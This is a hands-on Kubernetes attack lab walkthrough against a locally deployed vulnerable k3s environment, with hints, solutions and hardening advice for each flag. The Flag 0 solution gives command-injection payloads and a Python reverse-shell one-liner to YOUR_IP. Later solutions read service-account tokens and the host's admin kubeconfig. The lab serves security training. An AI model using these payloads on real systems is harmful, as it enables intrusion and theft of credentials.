# Attack Scenario: Compromise the Cluster

A hands-on attack simulation where you exploit common Kubernetes misconfigurations to capture flags. Everything runs locally on your k3s cluster.

## Scenario Background

You're a penetration tester who has discovered an internal web application belonging to ACME Corp. Your goal is to gain access, escalate privileges, and find sensitive data within their Kubernetes cluster.

**Your objectives:**

1. **Flag 0:** Gain initial access to the cluster
2. **Flag 1:** Find the database password
3. **Flag 2:** Read a secret from another namespace
4. **Flag 3:** Escape to the host node
5. **Flag 4:** Gain cluster-admin access

**Rules:**
- Start from outside the cluster (you only know the web app URL)
- Use only tools available to you and within the cluster
- Document the misconfigurations you exploit

---

## Setup

### Deploy the Vulnerable Environment

Run the setup script to deploy the attack scenario:

```bash
cd exercises/
chmod +x attack-setup.sh
./attack-setup.sh
```

The script will display the target URL when complete. It should look something like:

```
http://localhost:30080
```

Or if using a VM/remote server:

```
http://<node-ip>:30080
```

### Verify the Target is Running

Open the URL in your browser or use curl:

```bash
curl http://localhost:30080
```

You should see the ACME Corp Internal Tools page.

---

## Attack Walkthrough

Work through these challenges in order. Try to solve each one before reading the hints!

---

### Flag 0: Gain Initial Access

**Objective:** Get command execution inside the Kubernetes cluster.

**Starting point:** You have access to a web application at `http://localhost:30080`

**Reconnaissance:** Start by exploring the web application. What functionality does it offer?

<details>
<summary>Hint 1</summary>

Browse around the application. Check all the pages. One of them has functionality that interacts with the system.

Look at:
- http://localhost:30080/
- http://localhost:30080/diagnostics
- http://localhost:30080/status

</details>

<details>
<summary>Hint 2</summary>

The `/diagnostics` page has a "ping" feature. Think about how ping might be implemented on the backend. What happens if user input isn't properly sanitized?

Try entering something other than just an IP address.

</details>

<details>
<summary>Hint 3</summary>

This is a classic command injection vulnerability. The application likely does something like:

```python
os.system(f"ping -c 2 {user_input}")
```

If you input `; id`, it becomes:

```bash
ping -c 2 ; id
```

Try various command injection payloads:
- `; id`
- `| id`
- `$(id)`
- `` `id` ``

</details>

<details>
<summary>Solution</summary>

1. Navigate to `http://localhost:30080/diagnostics`

2. In the hostname field, enter a command injection payload:
   ```
   ; id
   ```

3. You should see output like:
   ```
   uid=0(root) gid=0(root) groups=0(root)
   ```

4. Now explore the environment:
   ```
   ; hostname
   ; ls -la /
   ; cat /etc/os-release
   ```

5. Confirm you're in Kubernetes:
   ```
   ; ls -la /var/run/secrets/kubernetes.io/serviceaccount/
   ```

6. To get a proper reverse shell (optional but useful):
   
   On your machine, start a listener:
   ```bash
   nc -lvnp 4444
   ```
   
   In the web form, enter:
   ```
   ; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
   ```

   Or use the web interface to run commands directly (easier for this lab).

**Flag 0 achieved!** You now have command execution inside a pod.

**Vulnerability exploited:** Command injection in web application. User input is passed directly to a shell command without sanitization.

**Better practice:**
- Never pass user input directly to shell commands
- Use parameterized commands or libraries (e.g., Python's `subprocess` with a list, not shell=True)
- Input validation and sanitization
- Principle of least privilege (the app doesn't need to run as root)

</details>

---

### Flag 1: Find the Database Password

**Objective:** Find credentials for the database.

**Starting point:** You have command execution in the `vulnerable-app` pod via the web interface.

<details>
<summary>Hint 1</summary>

What environment variables are set in this container? Applications often have credentials passed in as env vars.

</details>

<details>
<summary>Hint 2</summary>

Use command injection to run:
```
; env | grep -i pass
```

Or:
```
; env | grep -i db
```

Or just dump all environment variables:
```
; env
```

</details>

<details>
<summary>Solution</summary>

Using the command injection from Flag 0, enter in the diagnostics form:

```
; env
```

Or more specifically:
```
; env | grep -i db
```

You should find:
```
DB_PASSWORD=flag1-sup3r-s3cr3t-passw0rd
DB_HOST=database.internal
DB_USER=admin
```

**Flag 1:** `flag1-sup3r-s3cr3t-passw0rd`

**Misconfiguration exploited:** Sensitive credentials passed as environment variables. These can be seen by anyone with command execution in the pod, appear in `kubectl describe pod`, and may be logged.

**Better practice:** Use Kubernetes secrets mounted as files, or external secret managers.

</details>

---

### Flag 2: Access Another Namespace's Secrets

**Objective:** Read secrets from the `payments` namespace.

**Starting point:** Command execution in the `vulnerable-app` pod.

<details>
<summary>Hint 1</summary>

Check if there's a service account token mounted in this pod. Service account tokens allow pods to authenticate to the Kubernetes API.

```
; ls -la /var/run/secrets/kubernetes.io/serviceaccount/
```

</details>

<details>
<summary>Hint 2</summary>

You can interact with the Kubernetes API from inside a pod. The API server is available at `https://kubernetes.default.svc`.

First, get the token and test API access:
```
; cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

</details>

<details>
<summary>Hint 3</summary>

Use curl to query the Kubernetes API with the service account token:

```
; TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces
```

</details>

<details>
<summary>Solution</summary>

Using command injection, run this (all on one line in the form):

```
; TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/payments/secrets/payment-api-key
```

You'll get a JSON response. Look for the `data` field which contains base64-encoded values.

To decode in one shot:
```
; TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/payments/secrets/payment-api-key | grep -o '"api-key":"[^"]*"'
```

The base64 value `ZmxhZzItcGF5bWVudC1hcGkta2V5LTEyMzQ1` decodes to:

```
; echo "ZmxhZzItcGF5bWVudC1hcGkta2V5LTEyMzQ1" | base64 -d
```

**Flag 2:** `flag2-payment-api-key-12345`

**Misconfiguration exploited:** The service account has permissions to read secrets across namespaces. This violates the principle of least privilege.

**Better practice:** 
- Use namespace-scoped Roles, not ClusterRoles
- Only grant `get` on specific secrets if needed, never `list` on all secrets
- Disable auto-mounting of service account tokens when not needed (`automountServiceAccountToken: false`)

</details>

---

### Flag 3: Escape to the Host

**Objective:** Read a file from the host node's filesystem.

**Starting point:** You have command execution and know the service account can list pods.

<details>
<summary>Hint 1</summary>

Check what other pods are running in the `webapp` namespace. One of them might have dangerous security settings.

```
; TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/webapp/pods
```

Look for pod names in the output.

</details>

<details>
<summary>Hint 2</summary>

There's a "debug-pod" that's been left running. Examine its configuration. Is it running as privileged? Does it have host mounts?

```
; TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/webapp/pods/debug-pod | grep -i -A5 "privileged\|hostPath"
```

</details>

<details>
<summary>Hint 3</summary>

The service account has permission to exec into pods. You can use kubectl from outside, or continue to work with what you have access to.

Since getting kubectl working via command injection is tricky, exit the web interface and use kubectl directly:

```bash
kubectl exec -it -n webapp debug-pod -- /bin/sh
```

</details>

<details>
<summary>Solution</summary>

For this flag, it's easier to use kubectl from your terminal:

```bash
# Exec into the privileged debug pod
kubectl exec -it -n webapp debug-pod -- /bin/sh

# The host filesystem is mounted at /host
ls /host

# Read the flag from the host
cat /host/etc/flag3.txt
```

**Flag 3:** `flag3-h0st-f1l3syst3m-acc3ss`

You now have access to the entire host filesystem! You could also access:
- `/host/etc/kubernetes/pki/` (cluster PKI)
- `/host/var/lib/kubelet/` (kubelet data)
- `/host/root/` (root user's home directory)

**Misconfiguration exploited:** 
1. Privileged container running in the cluster
2. Host filesystem mounted into the container
3. Debug pods left running in production
4. Service account can exec into other pods

**Better practice:**
- Never run privileged containers in production
- Never mount the host filesystem (especially `/`)
- Remove debug/troubleshooting pods when done
- Use Pod Security Admission to block privileged pods

</details>

---

### Flag 4: Gain Cluster-Admin Access

**Objective:** Obtain full cluster-admin privileges.

**Starting point:** The privileged debug pod from Flag 3.

<details>
<summary>Hint 1</summary>

From a privileged pod with host access, you can access node-level credentials. Where does the Kubernetes control plane store its credentials?

</details>

<details>
<summary>Hint 2</summary>

On k3s, the kubeconfig with admin credentials is stored at `/etc/rancher/k3s/k3s.yaml` on the host.

Since you have the host filesystem at `/host`, check:
```
cat /host/etc/rancher/k3s/k3s.yaml
```

</details>

<details>
<summary>Hint 3</summary>

Once you have the kubeconfig, you need to modify the server address to be accessible from inside the pod. The kubeconfig points to `127.0.0.1:6443`, but from inside the pod you need to use `kubernetes.default.svc`.

</details>

<details>
<summary>Solution</summary>

From inside the debug pod:

```bash
# Read the k3s kubeconfig from the host
cat /host/etc/rancher/k3s/k3s.yaml

# Copy it and modify for use inside the pod
cp /host/etc/rancher/k3s/k3s.yaml /tmp/admin.yaml

# The kubeconfig points to 127.0.0.1:6443 which won't work from the pod
# Change it to the internal service address
sed -i 's|127.0.0.1|kubernetes.default.svc|g' /tmp/admin.yaml

# Install kubectl
apk add --no-cache curl
curl -LO "https://dl.k8s.io/release/$(curl -sL https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl

# Use the admin kubeconfig
export KUBECONFIG=/tmp/admin.yaml

# Verify cluster-admin access
./kubectl auth can-i '*' '*'
# Output: yes

# Get the final flag
./kubectl get secret -n kube-system cluster-admin-flag -o jsonpath='{.data.flag}' | base64 -d
```

**Flag 4:** `flag4-full-cluster-compromise`

You now have complete control over the cluster:
```bash
./kubectl get nodes
./kubectl get secrets -A
./kubectl get pods -A
./kubectl delete pods --all  # Please don't actually do this :)
```

**Misconfiguration exploited:**
1. Privileged container allowed host filesystem access
2. Node credentials accessible from compromised container
3. No additional protection on admin credentials

**Better practice:**
- Never allow privileged containers
- Use Pod Security Admission to enforce restrictions
- Consider node-level security (SELinux, AppArmor)
- Use short-lived credentials and audit logs
- Network policies to restrict pod-to-API-server access

</details>

---


## Misconfigurations Summary

| Flag | Vulnerability | Impact | Prevention |
|------|--------------|--------|------------|
| 0 | Command injection in web app | Initial access / RCE | Input sanitization, parameterized commands |
| 1 | Secrets in env vars | Credential exposure | Use mounted secrets or external vaults |
| 2 | Overly permissive RBAC | Cross-namespace access | Least privilege, namespace-scoped roles |
| 3 | Privileged pod + hostPath | Container escape | Pod Security Admission, no privileged pods |
| 4 | Host credential access | Full cluster takeover | Defense in depth, node hardening |

---

## Cleanup

Remove all attack scenario resources:

```bash
./attack-cleanup.sh
```

Or manually:

```bash
kubectl delete namespace webapp payments
kubectl delete clusterrole webapp-overprivileged
kubectl delete clusterrolebinding webapp-overprivileged-binding
kubectl delete secret -n kube-system cluster-admin-flag
sudo rm -f /etc/flag3.txt
```

---

## Defending Against These Attacks

Now that you've seen how these attacks work, here's how to prevent them:

### 0. Secure Your Applications
```python
# DON'T do this:
os.system(f"ping {user_input}")

# DO this instead:
import subprocess
subprocess.run(["ping", "-c", "2", user_input], shell=False)
# Even better: validate input is actually an IP/hostname
```

### 1. Prevent Credential Exposure
```yaml
# Mount secrets as files, not env vars
spec:
  containers:
  - name: app
    volumeMounts:
    - name: db-creds
      mountPath: /etc/secrets
      readOnly: true
  volumes:
  - name: db-creds
    secret:
      secretName: db-credentials
```

### 2. Lock Down RBAC
```yaml
# Use namespace-scoped Roles, not ClusterRoles
kind: Role  # Not ClusterRole!
metadata:
  namespace: webapp  # Scoped to one namespace
rules:
- apiGroups: [""]
  resources: ["configmaps"]  # Only what's needed
  verbs: ["get"]  # Minimum permissions
```

### 3. Disable Auto-Mounted Tokens
```yaml
# If pod doesn't need API access
spec:
  automountServiceAccountToken: false
```

### 4. Enforce Pod Security
```yaml
# Apply to namespace
apiVersion: v1
kind: Namespace
metadata:
  name: webapp
  labels:
    pod-security.kubernetes.io/enforce: restricted
```

### 5. Network Policies
```yaml
# Restrict API server access
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-metadata-and-api
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 169.254.169.254/32  # Cloud metadata
```

---

## Next Steps

1. **Fix the vulnerabilities** — Modify the manifests to be secure and verify the attacks no longer work
2. **Try Kubernetes Goat** — More advanced scenarios at https://github.com/madhuakula/kubernetes-goat
3. **Learn Falco** — Set up runtime detection for these attack patterns
4. **CIS Benchmarks** — Run kube-bench to find other issues